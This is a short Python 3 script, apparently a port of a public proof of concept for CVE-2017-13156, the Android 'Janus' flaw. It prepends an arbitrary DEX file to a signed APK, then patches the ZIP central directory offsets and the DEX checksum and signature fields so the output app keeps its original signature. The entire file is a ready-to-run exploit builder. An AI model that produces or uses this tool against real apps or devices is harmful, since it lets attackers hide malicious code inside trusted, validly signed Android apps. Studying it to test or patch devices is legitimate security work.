#!/usr/bin/env python3

# Original from https://github.com/V-E-O/PoC/tree/8c389899e6c4e16b2ddab9ba6d77c2696577366f/CVE-2017-13156
# Updated to Python 3+

import sys
import struct
import hashlib
from zlib import adler32


def update_checksum(data):
    m = hashlib.sha1()
    m.update(data[32:])
    data[12:12+20] = m.digest()

    v = adler32(memoryview(data[12:])) & 0xffffffff
    data[8:12] = struct.pack('<L', v)


def main():
    if len(sys.argv) != 4:
        print('Usage: {} <input_dex> <input_apk> <output_apk>'.format(__file__))
        return

    _, dex, apk, out_apk = sys.argv

    with open(dex, 'rb') as f:
        dex_data = bytearray(f.read())
    dex_size = len(dex_data)

    with open(apk, 'rb') as f:
        apk_data = bytearray(f.read())
    cd_end_addr = apk_data.rfind(b'\x50\x4b\x05\x06')
    cd_start_addr = struct.unpack('<L', apk_data[cd_end_addr+16:cd_end_addr+20])[0]
    apk_data[cd_end_addr+16:cd_end_addr+20] = struct.pack('<L', cd_start_addr+dex_size)

    pos = cd_start_addr
    while pos < cd_end_addr:
        offset = struct.unpack('<L', apk_data[pos+42:pos+46])[0]
        apk_data[pos+42:pos+46] = struct.pack('<L', offset+dex_size)
        pos = apk_data.find(b'\x50\x4b\x01\x02', pos+46, cd_end_addr)
        if pos == -1:
            break

    out_data = dex_data + apk_data
    out_data[32:36] = struct.pack('<L', len(out_data))
    update_checksum(out_data)

    with open(out_apk, 'wb') as f:
        f.write(out_data)

    print('Successfully generated {}.'.format(out_apk))


if __name__ == '__main__':
    main()
